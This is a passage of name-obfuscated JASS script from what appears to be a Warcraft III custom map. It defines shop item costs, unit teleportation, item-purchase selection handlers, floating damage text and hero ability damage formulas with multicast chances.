call kF(Hu,MO,$6763656C,6000,90)
call kF(Hu,MO,$49304E4E,750,0)
call kF(Hu,MO,$49304E4B,750,0)
call kF(Hu,MO,$49304E4C,750,0)
call kF(Hu,MO,$49304E4F,750,0)
call kF(Hu,MO,$49304E4D,750,0)
call kF(Hu,MO,$49304D45,90000,3600)
call kF(Hu,MO,$4930564C,90000,3600)
call kF(Hu,MO,$49304D47,1500,15)
call kF(Hu,MO,$49304D32,60000,1500)
call kF(Hu,MO,$49305A51,60000,150)
call kF(Hu,MO,$49304C38,105000,6000)
call kF(Hu,MO,$49305038,105000,6000)
call kF(Hu,MO,$49304C43,105000,6000)
call kF(Hu,MO,$49305041,105000,6000)
call kF(Hu,MO,$49304C39,105000,6000)
call kF(Hu,MO,$4931304E,105000,6000)
call kF(Hu,MO,$49304B51,225000,1800)
call kF(Hu,MO,$49304B48,0,1050)
call kF(Hu,MO,$49304B4A,0,1050)
call kF(Hu,MO,$49304B49,0,1050)
call kF(Hu,MO,$49304A53,45000,1500)
call kF(Hu,MO,$49304A49,45000,1800)
call kF(Hu,MO,$4930564D,45000,1800)
call kF(Hu,MO,$49304A46,105000,3000)
call kF(Hu,MO,$49304A47,105000,3000)
call kF(Hu,MO,$49304A48,105000,3000)
call kF(Hu,MO,$49304A45,105000,3000)
call kF(Hu,MO,$49305848,105000,3000)
call kF(Hu,MO,$49305849,105000,3000)
call kF(Hu,MO,$49303947,0,600)
call kF(Hu,MO,$49303945,0,600)
call kF(Hu,MO,$49303946,0,600)
call kF(Hu,MO,$49303944,0,600)
call kF(Hu,MO,$49303943,0,600)
call kF(Hu,MO,$49303545,0,450)
call kF(Hu,MO,$49303544,0,450)
call kF(Hu,MO,$49303543,0,450)
call kF(Hu,MO,$49303546,0,450)
call kF(Hu,MO,$49303938,0,450)
call kF(Hu,MO,$49303941,0,450)
call kF(Hu,MO,$49303942,0,450)
call kF(Hu,MO,$49303937,0,450)
call kF(Hu,MO,$49303939,0,450)
call kF(Hu,MO,$49303542,0,450)
call kF(Hu,MO,$49303353,0,375)
call kF(Hu,MO,$49303352,0,375)
call kF(Hu,MO,$49303354,0,375)
call kF(Hu,MO,$49303539,0,375)
call kF(Hu,MO,$49303537,0,375)
call kF(Hu,MO,$49303541,0,375)
call kF(Hu,MO,$49303538,0,375)
call kF(Hu,MO,$49303536,0,375)
call kF(Hu,MO,$49303456,0,375)
call kF(Hu,MO,$4930334C,0,300)
call kF(Hu,MO,$4930334B,0,300)
call kF(Hu,MO,$4930334D,0,300)
call kF(Hu,MO,$4930534B,0,300)
call kF(Hu,MO,$49303355,0,300)
call kF(Hu,MO,$49303351,0,300)
call kF(Hu,MO,$4930334E,0,300)
call kF(Hu,MO,$49303350,0,300)
call kF(Hu,MO,$4930334F,0,300)
call kF(Hu,MO,$49303345,0,225)
call kF(Hu,MO,$49303344,0,225)
call kF(Hu,MO,$49303343,0,225)
call kF(Hu,MO,$49303347,0,225)
call kF(Hu,MO,$49303349,0,225)
call kF(Hu,MO,$49303346,0,225)
call kF(Hu,MO,$4930334A,0,225)
call kF(Hu,MO,$49303348,0,225)
call kF(Hu,MO,$49305349,0,225)
call kF(Hu,MO,$49303335,0,150)
call kF(Hu,MO,$49303334,0,150)
call kF(Hu,MO,$49303336,0,150)
call kF(Hu,MO,$49303339,0,150)
call kF(Hu,MO,$49303342,0,150)
call kF(Hu,MO,$49303338,0,150)
call kF(Hu,MO,$49303337,0,150)
call kF(Hu,MO,$49303341,0,150)
call kF(Hu,MO,$49305345,0,150)
call kF(Hu,MO,$49303331,0,75)
call kF(Hu,MO,$49303333,0,75)
call kF(Hu,MO,$49303332,0,75)
call kF(Hu,MO,$49303259,0,75)
call kF(Hu,MO,$49303330,0,75)
call kF(Hu,MO,$4930494C,27000,600)
call kF(Hu,MO,$4930494A,27000,600)
call kF(Hu,MO,$4930494B,27000,600)
call kF(Hu,MO,$4930545A,27000,600)
call kF(Hu,MO,$49305459,27000,600)
call kF(Hu,MO,$49305458,27000,600)
call kF(Hu,MO,$49303358,150,0)
call kF(Hu,MO,$4930354E,150,0)
call kF(Hu,MO,$49303359,300,0)
call kF(Hu,MO,$49303551,300,0)
call kF(Hu,MO,$49305253,300,0)
call kF(Hu,MO,$4930354D,450,0)
call kF(Hu,MO,$49303552,450,0)
call kF(Hu,MO,$49303752,1500,0)
call kF(Hu,MO,$49303751,1500,0)
call kF(Hu,MO,$49305254,1500,0)
call kF(Hu,MO,$616A656E,2700,60)
call kF(Hu,MO,$49304146,2700,60)
call kF(Hu,MO,$49304141,2700,60)
call kF(Hu,MO,$49304144,2700,60)
call kF(Hu,MO,$6B70696E,2250,45)
call kF(Hu,MO,$49303549,2250,45)
call kF(Hu,MO,$7370726E,2250,45)
call kF(Hu,MO,$49303548,3000,60)
call kF(Hu,MO,$49304250,3000,60)
call kF(Hu,MO,$4930424E,3000,60)
call kF(Hu,MO,$49304A35,3000,60)
call kF(Hu,MO,$776E6575,3000,60)
call kF(Hu,MO,$49303635,9000,150)
call kF(Hu,MO,$49304F54,9000,150)
call kF(Hu,MO,$49304F4E,9000,150)
call kF(Hu,MO,$49304F50,9000,150)
call kF(Hu,MO,$49304F56,9000,150)
call kF(Hu,MO,$49304F52,9000,150)
call kF(Hu,MO,$49305138,9000,150)
call kF(Hu,MO,$49305141,9000,150)
call kF(Hu,MO,$49305144,9000,150)
call kF(Hu,MO,$49305137,9000,150)
call kF(Hu,MO,$49305135,9000,150)
call kF(Hu,MO,$49303455,9000,150)
call kF(Hu,MO,$77687764,9000,150)
call kF(Hu,MO,$49303644,12000,180)
call kF(Hu,MO,$4930434A,12000,180)
call kF(Hu,MO,$49304349,12000,180)
call kF(Hu,MO,$49304348,12000,180)
call kF(Hu,MO,$49304257,12000,180)
call kF(Hu,MO,$49304256,12000,180)
call kF(Hu,MO,$49305451,12000,180)
call kF(Hu,MO,$49305450,12000,180)
call kF(Hu,MO,$49305452,12000,180)
call kF(Hu,MO,$49303847,12000,180)
call kF(Hu,MO,$6876616C,12000,180)
call kF(Hu,MO,$49304153,30000,360)
call kF(Hu,MO,$49304151,30000,360)
call kF(Hu,MO,$49304155,30000,360)
call kF(Hu,MO,$4930345A,30000,360)
call kF(Hu,MO,$49303830,30000,360)
call kF(Hu,MO,$49304956,30000,360)
call kF(Hu,MO,$49305436,30000,360)
call kF(Hu,MO,$49303243,30000,360)
call kF(Hu,MO,$49305255,3000,0)
call kF(Hu,MO,$49303547,4500,75)
call kF(Hu,MO,$49304251,4500,75)
call kF(Hu,MO,$49304954,4500,75)
call kF(Hu,MO,$72737431,4500,75)
call kF(Hu,MO,$49304253,7500,90)
call kF(Hu,MO,$77737764,7500,90)
call kF(Hu,MO,$49303755,1800,30)
call kF(Hu,MO,$49303759,1800,30)
call kF(Hu,MO,$49303757,1800,30)
call kF(Hu,MO,$49305434,1800,30)
call kF(Hu,MO,$77696C64,1800,30)
call kF(Hu,MO,$73656872,1800,30)
call kF(Hu,MO,$49304259,16500,150)
call kF(Hu,MO,$49303453,16500,150)
call kF(Hu,MO,$4930324B,16500,150)
call kF(Hu,MO,$49303154,16500,150)
call kF(Hu,MO,$49303449,16500,150)
call kF(Hu,MO,$49304335,21000,240)
call kF(Hu,MO,$49304332,21000,240)
call kF(Hu,MO,$49304330,21000,240)
call kF(Hu,MO,$49304341,42000,600)
call kF(Hu,MO,$49304343,42000,600)
call kF(Hu,MO,$49304337,42000,600)
call kF(Hu,MO,$49305846,42000,600)
call kF(Hu,MO,$49313041,7500,0)
call kF(Hu,MO,$49313047,7500,0)
call kF(Hu,MO,$49313044,7500,0)
call kF(Hu,MO,$49313045,7500,0)
call kF(Hu,MO,$49313046,7500,0)
call kF(Hu,MO,$49313043,7500,0)
call kF(Hu,MO,$49313042,7500,0)
call kF(Hu,MO,$49305941,6000,90)
call kF(Hu,MO,$49304C59,15000,150)
call kF(Hu,MO,$49305957,15000,150)
call kF(Hu,MO,$49304C58,15000,150)
call kF(Hu,MO,$49304834,24000,240)
call kF(Hu,MO,$49305331,24000,240)
call kF(Hu,MO,$4930525A,24000,240)
call kF(Hu,MO,$49304D38,24000,240)
call kF(Hu,MO,$49303048,24000,240)
call kF(Hu,MO,$49305A30,24000,240)
call kF(Hu,MO,$49313051,30000,300)
call kF(Hu,MO,$49305933,30000,300)
call kF(Hu,MO,$49305A41,30000,300)
call kF(Hu,MO,$49305A37,30000,300)
call kF(Hu,MO,$49305A43,30000,300)
call kF(Hu,MO,$49305A42,30000,300)
call kF(Hu,MO,$49305348,30000,300)
call kF(Hu,MO,$49304554,30000,300)
call kF(Hu,MO,$49304D37,30000,300)
call kF(Hu,MO,$4930554A,30000,300)
call kF(Hu,MO,$49305054,30000,300)
call kF(Hu,MO,$49305959,30000,300)
call kF(Hu,MO,$72646530,6000,60)
call kF(Hu,MO,$73687273,0,300)
call kF(Hu,MO,$49313148,45000,450)
call kF(Hu,MO,$49313146,45000,450)
call kF(Hu,MO,$49313144,45000,450)
call kF(Hu,MO,$49313142,45000,450)
call kF(Hu,MO,$49313139,45000,450)
call kF(Hu,MO,$49313137,45000,450)
call kF(Hu,MO,$49313135,45000,450)
call kF(Hu,MO,$49313133,45000,450)
call kF(Hu,MO,$49313131,45000,450)
call kF(Hu,MO,$4931305A,45000,450)
call kF(Hu,MO,$49313058,45000,450)
call kF(Hu,MO,$49313056,45000,450)
call kF(Hu,MO,$4931304F,105000,6000)
call kF(Hu,MO,$49303930,0,300)
if GetUnitTypeId(NE)==$6E30365A then
set NK[GetPlayerId(GetOwningPlayer(Hu))+1]=NK[GetPlayerId(GetOwningPlayer(Hu))+1]-1950
elseif GetUnitTypeId(NE)==$6E303659 then
set NK[GetPlayerId(GetOwningPlayer(Hu))+1]=NK[GetPlayerId(GetOwningPlayer(Hu))+1]-1650
elseif GetUnitTypeId(NE)==$6E303658 then
set NK[GetPlayerId(GetOwningPlayer(Hu))+1]=NK[GetPlayerId(GetOwningPlayer(Hu))+1]-1350
elseif GetUnitTypeId(NE)==$6E303657 then
set NK[GetPlayerId(GetOwningPlayer(Hu))+1]=NK[GetPlayerId(GetOwningPlayer(Hu))+1]-1050
elseif GetUnitTypeId(NE)==$6E303656 then
set NK[GetPlayerId(GetOwningPlayer(Hu))+1]=NK[GetPlayerId(GetOwningPlayer(Hu))+1]-750
elseif GetUnitTypeId(NE)==$6E303655 then
set NK[GetPlayerId(GetOwningPlayer(Hu))+1]=NK[GetPlayerId(GetOwningPlayer(Hu))+1]-450
endif
if GetUnitTypeId(GetTriggerUnit())==$6E303847 then
set Ht=Location(10850.,5012.)
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
call SetUnitPositionLoc(NL[GetConvertedPlayerId(GetOwningPlayer(Hu))*2],Ht)
elseif GetUnitTypeId(GetTriggerUnit())==$6E303650 then
set Ht=Location(1376.,11950.)
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
call SetUnitPositionLoc(NL[GetConvertedPlayerId(GetOwningPlayer(Hu))*2],Ht)
elseif GetUnitTypeId(NE)==$6E30354D or GetUnitTypeId(NE)==$6E303837 then
set Ht=Location(11000,-7850)
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
call SetUnitPositionLoc(NL[GetConvertedPlayerId(GetOwningPlayer(Hu))*2],Ht)
elseif GetUnitTypeId(NE)==$6E30365A or GetUnitTypeId(NE)==$6E303336 or GetUnitTypeId(NE)==$6E303337 then
set Ht=Location(7450,-2190)
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
call SetUnitPositionLoc(NL[GetConvertedPlayerId(GetOwningPlayer(Hu))*2],Ht)
elseif GetUnitTypeId(NE)==$6E303659 or GetUnitTypeId(NE)==$6E303238 or GetUnitTypeId(NE)==$6E303239 then
set Ht=Location(-8070,15170)
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
call SetUnitPositionLoc(NL[GetConvertedPlayerId(GetOwningPlayer(Hu))*2],Ht)
elseif GetUnitTypeId(NE)==$6E303658 or GetUnitTypeId(NE)==$6E303149 or GetUnitTypeId(NE)==$6E30314A then
set Ht=Location(-8970,7888)
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
call SetUnitPositionLoc(NL[GetConvertedPlayerId(GetOwningPlayer(Hu))*2],Ht)
elseif GetUnitTypeId(NE)==$6E303657 or GetUnitTypeId(NE)==$6E303147 or GetUnitTypeId(NE)==$6E303148 then
set Ht=Location(-236,-9377)
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
call SetUnitPositionLoc(NL[GetConvertedPlayerId(GetOwningPlayer(Hu))*2],Ht)
elseif GetUnitTypeId(NE)==$6E303146 or GetUnitTypeId(NE)==$6E303656 or GetUnitTypeId(NE)==$6E303145 then
set Ht=Location(-4222.,-9051.)
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
call SetUnitPositionLoc(NL[GetConvertedPlayerId(GetOwningPlayer(Hu))*2],Ht)
elseif GetUnitTypeId(NE)==$6E303144 or GetUnitTypeId(NE)==$6E303655 or GetUnitTypeId(NE)==$6E303143 then
set Ht=Location(-15680,-8340)
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
call SetUnitPositionLoc(NL[GetConvertedPlayerId(GetOwningPlayer(Hu))*2],Ht)
endif
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(GetLocationX(Ht),GetLocationY(Ht),0)
call ClearSelection()
call SelectUnit(Hu,true)
endif
call RemoveLocation(Ht)
set Ht=null
set NF=true
set NE=null
set MO=null
set Hu=null
endfunction
function kH takes nothing returns nothing
local item MO=GetSoldItem()
local unit Hu=GetBuyingUnit()
local player Ht=GetOwningPlayer(Hu)
if GetItemTypeId(MO)==$49303736 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[0],true)
endif
elseif GetItemTypeId(MO)==$49303030 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[2],true)
endif
elseif GetItemTypeId(MO)==$49303035 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[3],true)
endif
elseif GetItemTypeId(MO)==$49303031 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[4],true)
endif
elseif GetItemTypeId(MO)==$49313033 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[5],true)
endif
elseif GetItemTypeId(MO)==$49313034 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[6],true)
endif
elseif GetItemTypeId(MO)==$49313035 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[7],true)
endif
elseif GetItemTypeId(MO)==$49313037 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[8],true)
endif
elseif GetItemTypeId(MO)==$49313036 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[9],true)
endif
elseif GetItemTypeId(MO)==$49313052 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[10],true)
endif
elseif GetItemTypeId(MO)==$49313053 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[11],true)
endif
elseif GetItemTypeId(MO)==$49313149 then
if GetLocalPlayer()==Ht then
call ClearSelection()
call SelectUnit(NC[12],true)
endif
endif
set Hu=null
set MO=null
endfunction
function kI takes nothing returns nothing
if GetLocalPlayer()==GetTriggerPlayer() then
call ClearSelection()
call PanCameraToTimed(-15590,1057,0)
call SelectUnit(NC[0],true)
endif
endfunction
function kJ takes nothing returns nothing
local unit Mc
if NO[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))]!=true then
set NO[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))]=true
set Mc=CreateUnitAtLoc(GetOwningPlayer(GetTriggerUnit()),$48303657,Location(-13660,1040),0)
call TriggerRegisterUnitEvent(ND,Mc,EVENT_UNIT_SELECTED)
set Mc=null
endif
endfunction
function kK takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer L9
local item MO
local integer NG
if GetSpellAbilityId()==$41303035 then
set L9=0
set NF=false
loop
set MO=UnitItemInSlot(Hu,L9)
set NG=GetItemTypeId(MO)
call RemoveItem(MO)
set MO=UnitAddItemByIdSwapped(NG,MT[GetPlayerId(GetOwningPlayer(Hu))])
call SetItemUserData(MO,GetPlayerId(GetOwningPlayer(Hu))+1)
set L9=L9+1
exitwhen L9>=6
endloop
set NF=true
endif
set MO=null
set Hu=null
endfunction
function kL takes nothing returns nothing
local trigger Hc
local region NM
local rect NN
set NC[0]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6E303434,Location(-15590,1057),0)
set NC[2]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6E30314D,Location(-15590,1057),0)
set NC[3]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6E303358,Location(-15590,1057),0)
set NC[4]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6E303359,Location(-15590,1057),0)
set NC[5]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$4F303037,Location(-15590,1057),0)
set NC[6]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6E303241,Location(-15590,1057),0)
set NC[7]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6830354F,Location(-15590,1057),0)
set NC[8]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6E636870,Location(-15590,1057),0)
set NC[9]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6E303432,Location(-15590,1057),0)
set NC[10]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6830374C,Location(-15590,1057),0)
set NC[11]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6830374D,Location(-15590,1057),0)
set NC[12]=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6830374E,Location(-15590,1057),0)
set ND=CreateTrigger()
call TriggerAddAction(ND,function kI)
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SELL_ITEM)
call TriggerAddAction(Hc,function kH)
call TriggerAddAction(Hc,function kG)
set Hc=null
set Hc=CreateTrigger()
set NM=CreateRegion()
set NN=GR
call RegionAddRect(NM,NN)
call TriggerRegisterEnterRegion(Hc,NM,null)
call TriggerAddAction(Hc,function kJ)
set Hc=null
set NN=null
set NM=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function kK)
set Hc=null
endfunction
function kM takes unit NQ,unit Hu,string M6,real NT,integer NU,integer NV,integer NW,real Nr returns nothing
local texttag NX
set NX=CreateTextTag()
call SetTextTagText(NX,M6,NT)
call SetTextTagPosUnit(NX,NQ,Nr)
call SetTextTagColor(NX,NU,NV,NW,255)
call SetTextTagVelocity(NX,0,.03)
call SetTextTagVisibility(NX,GetLocalPlayer()==GetOwningPlayer(Hu))
call SetTextTagFadepoint(NX,1)
call SetTextTagLifespan(NX,2)
call SetTextTagPermanent(NX,false)
call SetTextTagSuspended(NX,false)
endfunction
function kN takes nothing returns nothing
call KillUnit(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),10))
call RemoveUnit(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),10))
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),10)
endfunction
function kO takes unit Hu,real L9 returns nothing
local timer Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),10,Hu)
call TimerStart(Hc,L9,false,function kN)
set Hc=null
endfunction
function kP takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endfunction
function kQ takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endfunction
function kR takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
endfunction
function kS takes nothing returns nothing
local unit Nv=GetEnumUnit()
call kQ(Nh,Nv,Nu)
set Nv=null
endfunction
function kU takes nothing returns nothing
local unit Nv=GetEnumUnit()
call kP(Nh,Nv,Nu)
set Nv=null
endfunction
function kV takes nothing returns boolean
if IsUnitEnemy(GetFilterUnit(),Player(0))==false then
if IsUnitIllusion(GetFilterUnit())==false then
if UnitAlive(GetFilterUnit()) then
return true
endif
endif
endif
return false
endfunction
function kW takes nothing returns boolean
if IsUnitEnemy(GetFilterUnit(),Player(0))==true then
if UnitAlive(GetFilterUnit()) then
return true
endif
endif
return false
endfunction
function kX takes nothing returns nothing
local unit Hu=GetEnumUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Nh))+1
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)+I2R(GetHeroInt(Nh,true))*Nf[Ma]))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\HolyBolt\\HolyBoltSpecialArt.mdl",Hu,"overhead"))
set Hu=null
endfunction
function kY takes unit NR,unit NQ returns nothing
local integer L9=GetHeroStr(NR,true)*GetUnitAbilityLevel(NR,$41305550)*2
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real NT=I2R(L9)*Ng[Ma+1]
local group Na
local location Ht
local boolexpr Nb
call kP(NR,NQ,R2I(NT))
set Na=CreateGroup()
set Ht=GetUnitLoc(NR)
set Nb=Condition(function kV)
call GroupEnumUnitsInRangeOfLoc(Na,Ht,400,Nb)
set NR=Nh
call ForGroup(Na,function kX)
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
endfunction
function kZ takes nothing returns boolean
if GetUnitTypeId(GetFilterUnit())==$6E303651 then
return true
endif
return false
endfunction
function ka takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))+1
local group Na=CreateGroup()
local boolexpr Nb=Condition(function kZ)
local integer L9
local real NS
local string M6=""
call GroupEnumUnitsOfPlayer(Na,GetOwningPlayer(NR),Nb)
set L9=CountUnitsInGroup(Na)
set NS=I2R((150+GetHeroAgi(NR,true)/20*L9)*GetUnitAbilityLevel(NR,$41305554))*Nd[Ma]
call kQ(NR,NQ,R2I(NS))
if GetOwningPlayer(NR)==GetLocalPlayer() then
set M6="Objects\\Spawnmodels\\Naga\\NagaDeath\\NagaDeath.mdl"
endif
call DestroyEffect(AddSpecialEffectTarget(M6,NQ,"chest"))
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
set Nb=null
set Na=null
endfunction
function kb takes unit NR,unit NQ returns nothing
local location Ht=GetUnitLoc(NQ)
local unit Hu=CreateUnitAtLoc(GetOwningPlayer(NR),$68303358,Ht,0)
local string M6=""
call kO(Hu,3)
if GetOwningPlayer(NR)==GetLocalPlayer() then
set M6="war3mapImported\\Firey.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(M6,Ht))
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function kc takes unit NR,unit NQ returns nothing
local real Mc
local integer No
local real Np
if GetUnitLifePercent(NQ)<=90 then
set Mc=100-GetUnitLifePercent(NQ)
set No=GetUnitAbilityLevel(NR,$4130524D)*((GetHeroAgi(NR,true)+GetHeroInt(NR,true))/40+50)
set Np=I2R(No)*(Mc/10)*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(Np))
if GetUnitAbilityLevel(NR,$4130524B)>=1 and GetRandomInt(1,10)==1 then
call kb(NR,NQ)
endif
endif
endfunction
function kd takes unit NR,unit NQ returns nothing
local integer Mc
local real No
local real Np
if GetUnitAbilityLevel(NR,$41303950)>=1 then
if GetUnitAbilityLevel(NR,$41313651)>=1 then
if GetRandomInt(1,100)<=GetUnitAbilityLevel(NR,$41313651)*3 then
set Mc=50*GetUnitAbilityLevel(NR,$4130394F)+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/10)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No)*4)
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
call kM(NQ,NR,"+"+I2S(R2I(No)*4),.022,255,100,100,-10)
set Np=I2R(GetHeroStr(NR,true)/3*GetUnitAbilityLevel(NR,$41313651))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)+Np)
call kM(NR,NR,"|c00ff0000Multicast x4!|r "+"|c0000ff00+"+I2S(R2I(Np)),.022,255,255,255,10)
elseif GetRandomInt(1,100)<=GetUnitAbilityLevel(NR,$41313651)*6 then
set Mc=50*GetUnitAbilityLevel(NR,$4130394F)+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/10)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No)*3)
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
call kM(NQ,NR,"+"+I2S(R2I(No)*3),.022,255,100,100,-10)
set Np=I2R(GetHeroStr(NR,true)/3*GetUnitAbilityLevel(NR,$41313651))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)+Np)
call kM(NR,NR,"|c00ff0000Multicast x3!|r "+"|c0000ff00+"+I2S(R2I(Np)),.022,255,255,255,10)
elseif GetRandomInt(1,100)<=GetUnitAbilityLevel(NR,$41313651)*9 then
set Mc=50*GetUnitAbilityLevel(NR,$4130394F)+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/10)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No)*2)
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
call kM(NQ,NR,"+"+I2S(R2I(No)*2),.022,255,100,100,-10)
set Np=I2R(GetHeroStr(NR,true)/3*GetUnitAbilityLevel(NR,$41313651))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)+Np)
call kM(NR,NR,"|c00ff0000Multicast x2!|r "+"|c0000ff00+"+I2S(R2I(Np)),.022,255,255,255,10)
else
set Mc=50*GetUnitAbilityLevel(NR,$4130394F)+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/10)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
call kM(NQ,NR,"+"+I2S(R2I(No)),.022,255,100,100,-10)
endif
else
set Mc=50*GetUnitAbilityLevel(NR,$4130394F)+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/10)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
call kM(NQ,NR,"+"+I2S(R2I(No)),.022,255,100,100,-10)
endif
elseif GetUnitAbilityLevel(NR,$4130394F)>=1 then
if GetUnitAbilityLevel(NR,$41313651)>=1 then
if GetRandomInt(1,100)<=GetUnitAbilityLevel(NR,$41313651)*3 then
set Mc=750+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/7)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No)*4)
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
call kM(NQ,NR,"+"+I2S(R2I(No)*4),.022,255,100,100,-10)
set Np=I2R(GetHeroStr(NR,true)/3*GetUnitAbilityLevel(NR,$41313651))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)+Np)
call kM(NR,NR,"|c00ff0000Multicast x4!|r "+"|c0000ff00+"+I2S(R2I(Np)),.022,255,255,255,10)
elseif GetRandomInt(1,100)<=GetUnitAbilityLevel(NR,$41313651)*6 then
set Mc=750+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/7)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No)*3)
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
